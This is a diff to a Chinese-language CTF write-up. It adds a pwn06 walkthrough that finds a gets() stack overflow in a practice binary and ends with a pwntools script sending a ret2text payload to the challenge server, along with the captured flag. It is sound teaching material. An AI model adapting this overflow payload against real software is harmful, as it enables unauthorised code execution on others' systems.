@@ -356,7 +356,7 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn05/4.png)
 
-在`Function Window`中注意到有一个名为`stack()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。
+在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn05/5.png)
 
@@ -378,4 +378,45 @@ io.interactive()
 ![](https://paper.tanyaodan.com/CTFShow/pwn05/6.png)
 
 ------
+
+#### pwn06
+
+先`file ./stack`查看文件类型和`checksec --file=stack`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn06/1.png)
+
+用`IDA Pro 64bit`打开附件`pwn06`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn06/2.png)
+
+双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn06/3.png)
+
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn06/4.png)
+
+需要注意的是这题`pwn06`就是上一题`pwn05`的`64`位版本，所以需要加上`welcome()`函数的起始地址来平衡堆栈。
+
+在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn06/5.png)
+
+编写`Python`代码即可得到`ctfshow{384e6120-ef80-45f0-afe9-f64929450397}`。
+
+```python
+from pwn import *
+
+io = remote('pwn.challenge.ctf.show', 28194)
+e = ELF('pwn06')
+welcome_address = e.symbols['welcome']
+log.success('welcome_address => %s' % hex(welcome_address).upper())
+getFlag_address = e.symbols['getFlag']
+log.success('getFlag_address => %s' % hex(getFlag_address).upper())
+payload = b'a'*0xc + b'fuckpwn!' + p64(welcome_address) + p64(getFlag_address)
+# payload = b'a'*0xc + b'fuckpwn!' + p64(0x40058F) + p64(0x400577)
+io.sendline(payload)
+io.interactive()
+```
 
